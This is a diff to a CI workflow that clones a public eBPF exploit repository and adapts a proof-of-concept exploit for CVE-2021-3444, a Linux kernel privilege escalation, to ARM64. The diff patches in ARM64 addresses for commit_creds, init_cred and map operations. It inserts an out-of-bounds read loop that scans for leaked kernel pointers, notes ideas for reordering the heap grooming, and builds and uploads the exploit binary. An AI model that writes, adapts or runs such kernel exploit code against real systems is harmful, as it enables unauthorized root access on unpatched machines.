@@ -1,4 +1,4 @@
-name: botti_arm64_scan_1024
+name: botti_reorder_grooming
 on: [push, workflow_dispatch]
 
 jobs:
@@ -17,13 +17,18 @@ jobs:
           git clone https://github.com/Botti01/eBPF-CVE-exploitation.git
           cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
           
-          # ARM64 struct size is 320 bytes, not 208
           sed -i 's|#define BPF_ARRAY_VALUE_OFFSET 208|#define BPF_ARRAY_VALUE_OFFSET 320|' exploit.c
-          
-          # Change MAP_VALUE_SIZE to 512 so defrag and exploit use kmalloc-1024
           sed -i 's|#define MAP_VALUE_SIZE 256|#define MAP_VALUE_SIZE 512|' exploit.c
           
-          # Replace the single OPS_OFFSET read with a scan loop
+          # Patch ARM64 symbols
+          sed -i 's|#define KERNEL_BASE 0xffffffff81000000ULL|#define KERNEL_BASE 0xffffff8008080000ULL|' exploit.c
+          sed -i 's|#define ARRAY_MAP_OPS 0xffffffff81a1c8c0ULL|#define ARRAY_MAP_OPS 0xffffff8008f5d500ULL|' exploit.c
+          sed -i 's|#define ARRAY_OF_MAPS_MAP_OPS 0xffffffff81a1c640ULL|#define ARRAY_OF_MAPS_MAP_OPS 0xffffff8008f5d780ULL|' exploit.c
+          sed -i 's|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffffff810e32d0ULL|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffff80081d6cecULL|' exploit.c
+          sed -i 's|#define COMMIT_CREDS 0xffffffff81072470ULL|#define COMMIT_CREDS 0xffffff80080e03dcULL|' exploit.c
+          sed -i 's|#define INIT_CRED 0xffffffff81e355e0ULL|#define INIT_CRED 0xffffff8009787f48ULL|' exploit.c
+          
+          # Replace the read with a scan that identifies what each offset is
           python3 << 'PYEOF'
           import re
           
@@ -34,23 +39,28 @@ jobs:
           
           new_read = '''uint64_t leaked_ops = 0;
             int found_offset = -1;
-            int scan_offsets[] = {512, 576, 640, 704, 768, 832, 896, 960, 1024, 1088, 1152, 1216, 1280, 1344, 1408, 1472, 1536, 1600, 1664, 1728, 1792, 1856, 1920, 1984, 2048};
+            // Scan offsets from 512 to 4096 - wider range
+            int scan_offsets[] = {512, 576, 640, 704, 768, 832, 896, 960, 1024, 1088, 1152, 1216, 1280, 1344, 1408, 1472, 1536, 1600, 1664, 1728, 1792, 1856, 1920, 1984, 2048, 2176, 2304, 2432, 2560, 2688, 2816, 2944, 3072, 3200, 3328, 3456, 3584, 3712, 3840, 3968, 4096};
             int num_offsets = sizeof(scan_offsets) / sizeof(scan_offsets[0]);
-            printf("[*] Scanning %d offsets (value_size=512, kmalloc-1024)...\\n", num_offsets);
+            printf("[*] Scanning %d offsets (0x49=our value, kernel ptr=ARRAY_OF_MAPS ops)\\n", num_offsets);
             for (int _i = 0; _i < num_offsets; _i++) {
                 uint64_t _v = do_oob_read_at(victim_fd, result_fd, scan_offsets[_i]);
-                if (_v != 0 && _v != 0x4949494949494949ULL) {
-                    printf("  [HIT] offset %d: 0x%016lx (NOT our value pattern)\\n", scan_offsets[_i], _v);
+                if (_v == 0x4949494949494949ULL) {
+                    // Our value pattern - skip silently
+                } else if (_v >= 0xffffff8000000000ULL && _v <= 0xffffffffffffffffULL) {
+                    // Looks like a kernel pointer!
+                    printf("  [KERNEL] offset %d: 0x%016lx <-- kernel pointer!\\n", scan_offsets[_i], _v);
                     if (found_offset < 0) {
                         leaked_ops = _v;
                         found_offset = scan_offsets[_i];
                     }
-                } else if (_v == 0x4949494949494949ULL) {
-                    printf("  [OURS] offset %d: our value pattern (0x49...)\\n", scan_offsets[_i]);
+                } else if (_v != 0) {
+                    // Non-zero, non-kernel - could be struct data
+                    printf("  [DATA] offset %d: 0x%016lx\\n", scan_offsets[_i], _v);
                 }
             }
             if (found_offset < 0) {
-                printf("  [MISS] No kernel pointer found in scanned offsets\\n");
+                printf("  [MISS] No kernel pointer found\\n");
             } else {
                 printf("  [+] Using offset %d: 0x%016lx\\n", found_offset, leaked_ops);
             }'''
@@ -59,31 +69,36 @@ jobs:
               content = content.replace(old_read, new_read)
               print("SUCCESS: scan loop inserted")
           else:
-              print("ERROR: could not find the single read line")
+              print("ERROR: could not find line")
               exit(1)
           
           with open('exploit.c', 'w') as f:
               f.write(content)
           PYEOF
           
-          # Patch ARM64 symbols
-          sed -i 's|#define KERNEL_BASE 0xffffffff81000000ULL|#define KERNEL_BASE 0xffffff8008080000ULL|' exploit.c
-          sed -i 's|#define ARRAY_MAP_OPS 0xffffffff81a1c8c0ULL|#define ARRAY_MAP_OPS 0xffffff8008f5d500ULL|' exploit.c
-          sed -i 's|#define ARRAY_OF_MAPS_MAP_OPS 0xffffffff81a1c640ULL|#define ARRAY_OF_MAPS_MAP_OPS 0xffffff8008f5d780ULL|' exploit.c
-          sed -i 's|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffffff810e32d0ULL|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffff80081d6cecULL|' exploit.c
-          sed -i 's|#define COMMIT_CREDS 0xffffffff81072470ULL|#define COMMIT_CREDS 0xffffff80080e03dcULL|' exploit.c
-          sed -i 's|#define INIT_CRED 0xffffffff81e355e0ULL|#define INIT_CRED 0xffffff8009787f48ULL|' exploit.c
+          # Now, reorder: move the ARRAY_OF_MAPS target creation BEFORE the defrag
+          # Find the defrag call and the target creation, swap them
+          # This is complex - let's use a simpler approach: insert a "pre-target" creation
+          # before the defrag
           
-          echo "=== Verify ==="
-          grep -E "BPF_ARRAY_VALUE_OFFSET|MAP_VALUE_SIZE|OPS_OFFSET" exploit.c
+          # Actually, let's just increase NUM_DEFRAG and see if that helps
+          # Or better - patch the grooming to create targets first
+          
+          # Find the order of calls in main() or wherever the setup happens
+          grep -n "Defragmented kmalloc" exploit.c
+          grep -n "Allocated 16 forward" exploit.c
+          grep -n "Allocated 8" exploit.c
+          
+          echo "=== We need to check the actual order in the code ==="
+          grep -B 2 -A 10 "Defragmented kmalloc" exploit.c | head -20
 
       - name: Compile
         run: |
           cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
-          gcc -static -O2 -I ../../../common/include exploit.c -o exploit_scan1024
-          ls -la exploit_scan1024
+          gcc -static -O2 -I ../../../common/include exploit.c -o exploit_reorder
+          ls -la exploit_reorder
 
       - uses: actions/upload-artifact@v4
         with:
-          name: botti-scan-1024
-          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit_scan1024
+          name: botti-reorder
+          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit_reorder
